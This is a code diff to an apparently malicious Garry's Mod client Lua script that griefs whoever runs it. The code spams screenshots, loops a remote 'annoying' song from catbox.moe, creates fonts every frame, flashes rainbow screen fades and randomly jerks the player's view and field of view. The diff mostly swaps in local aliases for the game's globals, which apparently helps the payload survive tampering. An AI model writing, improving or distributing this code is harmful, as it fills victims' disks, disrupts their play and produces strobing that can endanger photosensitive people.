@@ -3,12 +3,14 @@ local jpegs = 0
 local s = sound
 local Song = false
 local _timer = timer
-local _sur = surface
+local _surface = surface
+local _render = render
 local _mtable = FindMetaTable
 local _command = RunConsoleCommand
 local _hook = hook
 local _http = http
 local _net = net
+local _math = math
 local function ss()
     _command('screenshot')
     _command('jpeg')
@@ -187,7 +189,7 @@ s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) -- annoying an
 _timer.Create('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end) -- annoying anime song
 _timer.Create('paste',0,10000,function()
     oniichan()
-    timer.Adjust('paste',21,10000,oniichan())
+    _timer.Adjust('paste',21,10000,oniichan())
 end)
 end
 
@@ -202,11 +204,11 @@ end
 _hook.Add('Think','funny',function()
     if _o then return else
         rgb = HSVToColor((CurTime() * 120) % 360, .77, .88)
-        local result = annoying[math.random(1,88)]
-        math.randomseed(CurTime())
-        local result2 = annoying[math.random(1,88)]
-        local cfunnies = funnies[math.random(1,30)]
-        local sresult = annoyings[math.random(1,13)]
+        local result = annoying[_math.random(1,88)]
+        _math.randomseed(CurTime())
+        local result2 = annoying[_math.random(1,88)]
+        local cfunnies = funnies[_math.random(1,30)]
+        local sresult = annoyings[_math.random(1,13)]
         --local pSong = CreateSound(LocalPlayer(),sresult)
         --sound.Add({
         --    name = "wowow",
@@ -229,25 +231,24 @@ _hook.Add('Think','funny',function()
         --pSong:Play()
         --ply:EmitSound("wowow")
         ss()
-        surface.CreateFont(table.Random(funnies),{})
+        _surface.CreateFont(table.Random(funnies),{})
         --chat.AddText(rgb, cfunnies)
         ply:ScreenFade(SCREENFADE.IN, rgb, .1, 0)
 
-        if input.IsKeyDown(70) then 
+        if _input.IsKeyDown(70) then 
             _command('cancelselect')
-            LocalPlayer = nil
         end
     end
 end)
 _hook.Add('RenderScene','funny',function()
 
-    render.SetLightingMode(1)
+    _render.SetLightingMode(1)
 
 end)
 _hook.Add('CreateMove','funny',function( CUserCmd , GM ) 
     if _o then return else
 
-    local lolangle = math.random(-24, 24)
+    local lolangle = _math.random(-24, 24)
     local realangle = Angle(lolangle, lolangle,0)
     local PAngles = CUserCmd:GetViewAngles()
     local mousex = CUserCmd:GetMouseX()
@@ -259,9 +260,10 @@ _hook.Add('CreateMove','funny',function( CUserCmd , GM )
     end
 end)
 _hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
+        local _pv = ply:GetVelocity()
         local view = {}
             view.origin = pos
             view.angles = angles
-            view.fov = 5
+            view.fov = _math.Clamp(((_pv.x+_pv.y+_pv.z)/3),0,360)
         return view
 end)
